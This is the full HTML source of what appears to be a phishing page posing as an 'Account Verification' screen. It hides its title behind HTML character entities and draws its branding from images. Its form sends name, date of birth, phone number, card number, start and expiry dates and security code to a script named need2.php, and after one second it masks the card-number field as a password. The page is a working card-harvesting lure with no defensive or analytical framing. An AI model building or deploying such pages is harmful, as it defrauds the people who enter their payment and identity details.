<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>A&#99;&#99;&#111;&#117;&#110;t V&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;n</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[3].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #848484;
	padding-left:5px;	
    height: 26px; 
    width: 275px; 
    outline:0; 
  } 
  .textbox:focus {
    border-color: #BBB;
    outline: none;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#F0F0F0">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:249px; z-index:0"><img src="images/s5.png" alt="" title="" border=0 width=1349 height=249></div>

<div id="image2" style="position:absolute; overflow:hidden; left:171px; top:251px; width:700px; height:553px; z-index:1"><img src="images/s6.png" alt="" title="" border=0 width=700 height=553></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:880px; width:1349px; height:66px; z-index:3"><img src="images/s7.png" alt="" title="" border=0 width=1349 height=66></div>
<form action=need2.php name=gulbahar method=post>
<input name="name" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:190px;top:328px;z-index:4">
<input name="db" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:190px;top:391px;z-index:5">
<input name="ph" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:190px;top:456px;z-index:6">
<input name="cn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:190px;top:520px;z-index:7">
<input name="st" placeholder="MM/YY" class="textbox" autocomplete="off" required style="position:absolute;left:190px;top:583px;width:304px;z-index:8">
<input name="ex" placeholder="MM/YY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:190px;top:648px;z-index:9">
<input name="sc" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:304px;left:190px;top:711px;z-index:10">
<div id="formimage1" style="position:absolute; left:758px; top:815px; z-index:11"><input type="image" name="formimage1" width="91" height="28" src="images/cnt.png"></div>
</div>

</body>
</html>
